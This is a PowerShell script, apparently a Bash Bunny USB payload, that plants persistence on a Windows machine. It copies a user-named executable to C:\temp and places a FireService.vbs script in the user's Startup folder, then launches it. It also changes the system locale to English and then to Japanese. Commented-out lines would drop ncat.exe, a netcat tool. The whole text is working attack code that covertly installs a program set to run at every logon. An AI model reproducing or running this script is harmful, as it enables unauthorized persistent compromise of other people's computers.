Set-Culture en-US
Set-WinSystemLocale -SystemLocale en-US
Set-WinUserLanguageList en-US -Force

$Drive = (Get-WMIObject Win32_Volume | ? { $_.Label -eq 'BashBunny' }).name
$user = $env:UserName
# $NetCatFile = $Drive + "payloads\switch1\ncat.exe"
$GoFile = $Drive + "payloads\switch1\[YOUR EXECUTABLE FILENAME HERE]"
$PersistenceFile = $Drive + "payloads\switch1\FireService.vbs"
# $DestinationFile1 = "C:\temp\ncat.exe"
$DestinationFile2 = ("C:\Users\" + $user + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\FireService.vbs")
# $DestinationFile2 = ('\"C:\Users\' + $user + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\persistence1.vbs"\')
# $DestinationFile2 = ("C:\Users\" + '\'' + $user + '\'' + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\persistence1.vbs")
$DestinationFile3 = "C:\temp\[YOUR EXECUTABLE FILENAME HERE]"

# If ((Test-Path $DestinationFile1) -eq $false){
#	New-Item -ItemType File -Path $DestinationFile1 -Force
# }
If ((Test-Path $DestinationFile2) -eq $false){
	New-Item -ItemType File -Path $DestinationFile2 -Force
}
If ((Test-Path $DestinationFile3) -eq $false){
	New-Item -ItemType File -Path $DestinationFile3 -Force
}

# Copy-Item -Path $NetCatFile -Destination $DestinationFile1
# Start-Sleep -Seconds 2
Copy-Item -Path $PersistenceFile -Destination $DestinationFile2
Start-Sleep -Seconds 2
Copy-Item -Path $GoFile -Destination $DestinationFile3
Start-Sleep -Seconds 4

Set-Location -Path ("C:\Users\" + $user + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup")
#Set-Location -Path ('\"C:\Users\' + $user + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\"')

Set-Culture ja-JP
Set-WinSystemLocale -SystemLocale ja-JP
Set-WinUserLanguageList ja-JP -Force

Start-Process cmd -ArgumentList "/c start FireService.vbs"

